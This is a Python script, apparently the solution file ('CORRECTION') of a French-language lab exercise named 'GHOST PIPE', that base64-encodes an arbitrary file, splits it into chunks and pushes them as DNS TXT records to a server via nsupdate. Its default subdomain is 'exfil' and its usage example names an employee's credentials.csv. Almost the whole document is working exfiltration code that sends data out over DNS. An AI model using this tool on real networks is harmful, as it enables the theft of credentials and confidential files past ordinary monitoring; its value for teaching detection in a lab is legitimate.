#!/usr/bin/env python3
"""
═══════════════════════════════════════════════════════════════
  GHOST PIPE — Phase 1 : Injection DNS via nsupdate (Python)
  CORRECTION — Version avancée avec gestion d'erreurs
═══════════════════════════════════════════════════════════════
"""

import subprocess
import base64
import hashlib
import sys
import os
import tempfile
import math

# ── Configuration ────────────────────────────────────────────
DNS_SERVER = "172.20.0.53"
ZONE = "corp.local"
CHUNK_SIZE = 250          # Caractères base64 par TXT record
TTL = 3600


def encode_file(filepath: str) -> tuple[str, str, int]:
    """Encode un fichier en base64 et calcule son hash."""
    with open(filepath, "rb") as f:
        raw = f.read()
    b64 = base64.b64encode(raw).decode("ascii")
    sha256 = hashlib.sha256(raw).hexdigest()
    return b64, sha256, len(raw)


def split_chunks(data: str, size: int) -> list[str]:
    """Découpe une chaîne en chunks de taille fixe."""
    return [data[i:i+size] for i in range(0, len(data), size)]


def build_nsupdate_commands(filename: str, chunks: list[str],
                             sha256: str, orig_size: int,
                             subdomain: str) -> str:
    """Construit le batch de commandes nsupdate."""
    lines = [
        f"server {DNS_SERVER}",
        f"zone {ZONE}",
        "",
    ]

    # Record de métadonnées (chunk-000)
    meta = f"{filename}|{len(chunks)}|{sha256}|{orig_size}"
    lines.append(
        f'update add chunk-000.{subdomain}.{ZONE}. {TTL} TXT "{meta}"'
    )

    # Chunks de données (chunk-001, chunk-002, ...)
    for i, chunk in enumerate(chunks, start=1):
        num = f"{i:03d}"
        lines.append(
            f'update add chunk-{num}.{subdomain}.{ZONE}. {TTL} TXT "{chunk}"'
        )

    lines.append("")
    lines.append("send")
    return "\n".join(lines)


def inject(filepath: str, subdomain: str = "exfil"):
    """Pipeline complet d'injection."""
    filename = os.path.basename(filepath)
    filesize = os.path.getsize(filepath)

    print("══════════════════════════════════════════════════")
    print("  GHOST PIPE — Injection DNS TXT (Python)")
    print("══════════════════════════════════════════════════")
    print(f"  Fichier       : {filename} ({filesize} octets)")
    print(f"  Serveur DNS   : {DNS_SERVER}")
    print(f"  Sous-domaine  : {subdomain}")
    print()

    # Encodage
    print("[1/3] Encodage base64 + hash SHA256...")
    b64_data, sha256, orig_size = encode_file(filepath)
    print(f"      Base64 : {len(b64_data)} caractères")
    print(f"      SHA256 : {sha256}")

    # Découpage
    print("[2/3] Découpage en chunks...")
    chunks = split_chunks(b64_data, CHUNK_SIZE)
    nb_chunks = len(chunks)
    print(f"      {nb_chunks} chunks de {CHUNK_SIZE} caractères max")

    # Injection
    print(f"[3/3] Injection de {nb_chunks + 1} records TXT via nsupdate...")
    batch = build_nsupdate_commands(filename, chunks, sha256,
                                     orig_size, subdomain)

    # Écriture dans un fichier temporaire et exécution
    with tempfile.NamedTemporaryFile(mode="w", suffix=".txt",
                                      delete=False) as tmp:
        tmp.write(batch)
        tmp_path = tmp.name

    try:
        result = subprocess.run(
            ["nsupdate", tmp_path],
            capture_output=True, text=True, timeout=30
        )
        if result.returncode != 0:
            print(f"[!] Erreur nsupdate : {result.stderr}")
            sys.exit(1)
    finally:
        os.unlink(tmp_path)

    print()
    print("══════════════════════════════════════════════════")
    print("  ✅ INJECTION TERMINÉE")
    print("══════════════════════════════════════════════════")
    print(f"  Records : {nb_chunks + 1} TXT")
    print(f"  Pattern : chunk-XXX.{subdomain}.{ZONE}")
    print()
    print("  Vérification :")
    print(f"    dig TXT chunk-000.{subdomain}.{ZONE} @{DNS_SERVER}")
    print(f"    dig TXT chunk-001.{subdomain}.{ZONE} @{DNS_SERVER}")
    print("══════════════════════════════════════════════════")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <fichier> [sous-domaine]")
        print(f"  Ex:  {sys.argv[0]} /home/employe/documents/credentials.csv secret")
        sys.exit(1)

    filepath = sys.argv[1]
    subdomain = sys.argv[2] if len(sys.argv) > 2 else "exfil"

    if not os.path.isfile(filepath):
        print(f"[!] Fichier introuvable : {filepath}")
        sys.exit(1)

    inject(filepath, subdomain)
